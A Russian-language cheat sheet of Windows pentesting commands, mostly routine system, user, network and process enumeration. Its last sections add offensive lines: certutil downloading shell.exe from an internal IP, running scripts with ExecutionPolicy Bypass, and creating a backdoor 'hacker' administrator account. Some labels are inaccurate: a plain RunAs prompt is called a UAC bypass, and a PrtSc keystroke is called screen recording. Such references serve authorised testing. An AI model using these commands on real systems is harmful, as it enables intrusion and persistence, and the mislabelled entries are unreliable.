# 🪟 Windows Pentesting Commands

## Информация о системе
```cmd
systeminfo              # Полная информация
hostname                # Имя хоста
whoami                  # Текущий пользователь
whoami /priv            # Привилегии
set                     # Переменные окружения
```

## Пользователи и группы
```cmd
net user                # Все пользователи
net user username       # Информация о пользователе
net localgroup          # Все группы
net localgroup Administrators  # Администраторы
```

## Сеть
```cmd
ipconfig /all           # Все интерфейсы
ipconfig /displaydns    # DNS кэш
netstat -ano            # Все соединения и порты
netstat -ano | findstr LISTENING  # Слушающие порты
route print             # Таблица маршрутизации
arp -a                  # ARP таблица
nslookup domain.com     # DNS запрос
```

## Процессы и службы
```cmd
tasklist                # Все процессы
tasklist /v             # Детальная информация
taskkill /PID 1234 /F   # Убить процесс
sc query                # Все службы
sc query state= all     # Все службы
wmic service list brief # Службы (WMI)
```

## Файлы и папки
```cmd
dir /a                  # Все файлы
dir /s /b *.config      # Поиск файлов
tree /F                 # Дерево папок
icacls C:\folder        # Права доступа
```

## PowerShell
```powershell
Get-Process             # Процессы
Get-Service             # Службы
Get-WmiObject -Class Win32_OperatingSystem  # Информация
Get-ChildItem -Recurse -Filter *.config     # Поиск
```

## Повышение привелегий
```cmd
# Проверка привилегий
whoami /priv

# Исполнение от имени администратора
runas /user:Administrator cmd.exe

# Обход UAC (PowerShell)
Start-Process cmd.exe -Verb RunAs
```

## Сбор информации
```cmd
# Запись экрана
powershell -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')"

# Список установленного ПО
wmic product get name,version

# Информация о системе
systeminfo | findstr /i "os hotfix"  # ОС и патчи
```

## Полезные команды
```cmd
# Скачать файл
certutil -urlcache -f http://10.0.0.1/shell.exe shell.exe

# Выполнить скрипт PowerShell
powershell -ExecutionPolicy Bypass -File script.ps1

# Создать пользователя
net user hacker Pass123 /add
net localgroup Administrators hacker /add
```
